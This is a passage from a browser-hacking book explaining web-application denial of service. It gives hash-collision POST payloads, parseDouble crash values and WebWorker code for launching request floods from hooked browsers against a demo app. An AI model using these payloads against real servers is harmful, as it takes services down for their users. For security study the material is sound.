
Many web applications have pages or resources that may require computational power or time to complete. A dynamic resource that executes a query joining multiple, potentially large tables requires more time to complete. This is particularly the case compared to a static resource, such as an image or just a static HTML file. If you want to generate a DoS condition, or just slow down a target application, it would be simple enough to send multiple requests to one of these slow-responding resources. This can be amplified by sending these requests from multiple sources at the same time. It may actually be more feasible and convenient to slow down or DoS a server by targeting pinch points in a web application than simply relying on TCP-based SYN-floods.

Multiple vulnerabilities have been discovered in programming languages like Java, PHP, and Python that introduce DoS conditions at the language layer. These have exploited how the parsing of big numbers or dealing with specially crafted Hash data structures can slow down processing to a crawl. These attacks potentially affect every application using that programming language, exposing a much larger attack surface than simply attacking a single application.

DoSing web applications by requesting slow-responding and dynamic resources is discussed in the next section.

### Hash Collision DoS

In late 2011, it was disclosed30 that multiple programming languages, including PHP, Python, Java, and Ruby were vulnerable to DoS attacks if a specially crafted hash table was evaluated. Many web application frameworks developed in these languages unfortunately had one thing in common: they parsed raw HTTP requests and stored headers and body information in hash objects. From a development point of view, this is a convenient way to store and query the HTTP Request object. HTTP parameters are key=value, the same as hash data structures that are key=value.

A hash table by definition can’t contain duplicate key entries, and the algorithmic complexity of trying to insert N entries that share the same colliding key becomes O(n^2). The developers of other languages (such as Perl) foresaw this same potential issue in 2003, and added randomization to their hash functions. Their proactive efforts resulted in effectively preventing this DoS.

String hash functions used by Java and PHP use the DJBX33A algorithm, which is vulnerable to the so-called “Equivalent substrings” attack. Let’s explore this attack with the following code snippet in Java:

```
public class HashCode{
 public static void main(String[] args){
  String a = "Aa";
  String b = "BB";
  String c = "AaBBBBAa";
  String d = "BBAaAaBB";
  System.out.println("Hash code for "+a+":" + a.hashCode());
  System.out.println("Hash code for "+b+":" + b.hashCode());
  System.out.println("Hash code for "+c+":" + a.hashCode());
  System.out.println("Hash code for "+d+":" + b.hashCode());
 }
}
```

If you run this code, it will output the same hash code for all four different strings: 2112. This behavior can be exploited by creating a Hash table that contains such strings as keys, which collide from the hash code perspective. This situation is very computationally expensive,31 and can be amplified by having the application process multiple large hashes with colliding keys at the same time.

Exploiting the fact that many web application frameworks parse raw HTTP requests by storing data in a Hash table allows you to submit a POST request with a body containing parameter keys that will collide. For instance:

```
Aa=Aa&BB=BB&AaBBBBAa=AaBBBBAa&BBAaAaBB=BBAaAaBB&[...]
```

This serves as an interesting example of how simple design decisions can introduce a widely impacting vulnerability.

### Function parseDouble() DoS

In 2011, Rick Regan and Konstantin Preißer found32 that Java versions 1.5 up to 1.6 update 22 and PHP versions 5.2 and 5.3 were vulnerable to DoS attacks when converting a String to a Double precision Float number (Double object in Java). If a web application was using vulnerable code such as Double.parseDouble(request.getParameter("id")); and the value of the id parameter was 2.2250738585072012e-308 or 0.022250738585072012e-00306, the code would enter into an infinite loop. This would effectively DoS either the web application or the application server. Such behavior was due to a bug in the floating-point implementation of Java and PHP.

This attack is trivially launched cross-origin from the hooked browser, potentially even blindly. It is enough to create either a GET or POST request to a Java servlet that accepts numeric parameter values, using as a value one of the numbers presented earlier.

## DDoS Using Multiple Hooked Browsers

There is no necessity for a DoS attack against a web application to originate from an operating system fully under the control of an attacker. The HTTP requests that stress pinch points can just as successfully be launched from a web browser or even multiple browsers simultaneously. Employing multiple browsers effectively creates a Distributed Denial-of-Service attack (DDoS).

Consider the following simple Ruby web application. The application accepts two requests: a POST request, expecting two parameters that are used to insert new data into a MySQL database; and a GET request that queries the same database with join between the two tables:

```
require 'rubygems'
require 'thin'
require 'rack'
require 'sinatra'
require 'cgi'
require 'mysql'

class Books < Sinatra::Base
  post "/" do
    author = params[:author]
    name = params[:name]
    db = Mysql.new('127.0.0.1', 'root', 'toor', 'books')
    statement = db.prepare "insert into books (name,author) \
 values (?,?);"
    statement.execute name, author
    statement.close 
    "INSERT successful"
  end

  get "/" do
    book_id = params[:book_id]
    db = Mysql.new('127.0.0.1', 'root', 'toor', 'books')
    statement = db.prepare "select a.author, a.address, b.name \
from author a, books b where a.author = b.author"
    statement.execute
    result = ""
    statement.each do |item|
       result += CGI::escapeHTML(item.inspect)+"<br>"
    end
    statement.close
    result
  end
end

@routes = {
    "/books" => Books.new,
}

@rack_app = Rack::URLMap.new(@routes)
@thin = Thin::Server.new("172.16.37.150", 80, @rack_app)

Thin::Logging.silent = true
Thin::Logging.debug = false

puts "[#{Time.now}] Thin ready"
@thin.start
```

You can probably already see the application pinch points from the code; the join is between two tables, one of which is the same table that gets updated through the POST request. If you’re able to issue multiple POST requests with a lot of POST data at the same time as executing multiple GET requests, the join operation will be working on growing data as more requests arrive at the application.

The best way to issue multiple cross-origin HTTP requests from a hooked browser is using a WebWorker. This approach minimizes the risk to impact the performance of page rendering and other browser processing duties. WebWorkers were introduced in HTML5 and are supported by all modern browsers including IE10. WebWorkers are a mechanism to execute scripts in background threads. The code executed inside a WebWorker cannot directly modify the DOM of the page, but can issue XHRs.

To start a WebWorker job, you can use the following code:

```
var worker = new Worker('http://browserhacker.com/worker.js');

worker.onmessage = function (oEvent) {
  console.log('WebWorker says: '+oEvent.data);
};

var data = {};
data['url'] = url;
data['delay'] = delay;
data['method'] = method;
data['post_data'] = post_data;

/* send the config options to the WebWorker */
worker.postMessage(data);
```

postMessage() is being used to share data between the DOM where your JavaScript hooking code is running, and the WebWorker. The WebWorker code can be something like the following:
